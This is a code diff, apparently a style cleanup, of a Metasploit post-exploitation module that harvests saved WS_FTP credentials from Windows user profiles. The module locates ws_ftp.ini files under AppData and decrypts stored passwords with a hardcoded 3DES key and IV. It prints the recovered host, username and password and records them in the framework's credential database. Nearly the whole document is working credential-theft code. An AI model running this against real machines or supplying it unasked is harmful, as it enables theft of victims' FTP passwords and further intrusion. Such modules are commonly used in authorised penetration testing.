@@ -37,23 +37,21 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    print_status("Checking Default Locations...")
-    grab_user_profiles().each do |user|
-      next if user['AppData'] == nil
+    print_status('Checking Default Locations...')
+    grab_user_profiles.each do |user|
+      next if user['AppData'].nil?
 
-      check_appdata(user['AppData'] + "\\Ipswitch\\WS_FTP\\Sites\\ws_ftp.ini")
-      check_appdata(user['AppData'] + "\\Ipswitch\\WS_FTP Home\\Sites\\ws_ftp.ini")
+      check_appdata(user['AppData'] + '\\Ipswitch\\WS_FTP\\Sites\\ws_ftp.ini')
+      check_appdata(user['AppData'] + '\\Ipswitch\\WS_FTP Home\\Sites\\ws_ftp.ini')
     end
   end
 
   def check_appdata(path)
-    begin
-      client.fs.file.stat(path)
-      print_status("Found File at #{path}")
-      get_ini(path)
-    rescue
-      print_status("#{path} not found ....")
-    end
+    client.fs.file.stat(path)
+    print_status("Found File at #{path}")
+    get_ini(path)
+  rescue StandardError
+    print_status("#{path} not found ....")
   end
 
   def get_ini(filename)
@@ -62,33 +60,33 @@ class MetasploitModule < Msf::Post
     ini = Rex::Parser::Ini.from_s(parse)
 
     ini.each_key do |group|
-      next if group == "_config_"
+      next if group == '_config_'
 
       print_status("Processing Saved Session #{group}")
       host = ini[group]['HOST']
-      host = host.delete "\""
+      host = host.delete '"'
       username = ini[group]['UID']
-      username = username.delete "\""
+      username = username.delete '"'
       port =	ini[group]['PORT']
       passwd = ini[group]['PWD']
       passwd = decrypt(passwd)
 
-      next if passwd == nil or passwd == ""
+      next if passwd.nil? || (passwd == '')
 
-      port = 21 if port == nil
+      port = 21 if port.nil?
       print_good("Host: #{host} Port: #{port} User: #{username}  Password: #{passwd}")
       service_data = {
         address: Rex::Socket.getaddress(host),
         port: port,
-        protocol: "tcp",
-        service_name: "ftp",
+        protocol: 'tcp',
+        service_name: 'ftp',
         workspace_id: myworkspace_id
       }
 
       credential_data = {
         origin_type: :session,
         session_id: session_db_id,
-        post_reference_name: self.refname,
+        post_reference_name: refname,
         username: username,
         private_data: passwd,
         private_type: :password
@@ -98,7 +96,7 @@ class MetasploitModule < Msf::Post
 
       login_data = {
         core: credential_core,
-        access_level: "User",
+        access_level: 'User',
         status: Metasploit::Model::Login::Status::UNTRIED
       }
 
@@ -107,10 +105,10 @@ class MetasploitModule < Msf::Post
   end
 
   def decrypt(pwd)
-    decoded = pwd.unpack("m*")[0]
+    decoded = pwd.unpack('m*')[0]
     key = "\xE1\xF0\xC3\xD2\xA5\xB4\x87\x96\x69\x78\x4B\x5A\x2D\x3C\x0F\x1E\x34\x12\x78\x56\xab\x90\xef\xcd"
     iv = "\x34\x12\x78\x56\xab\x90\xef\xcd"
-    des = OpenSSL::Cipher.new("des-ede3-cbc")
+    des = OpenSSL::Cipher.new('des-ede3-cbc')
 
     des.decrypt
     des.key = key
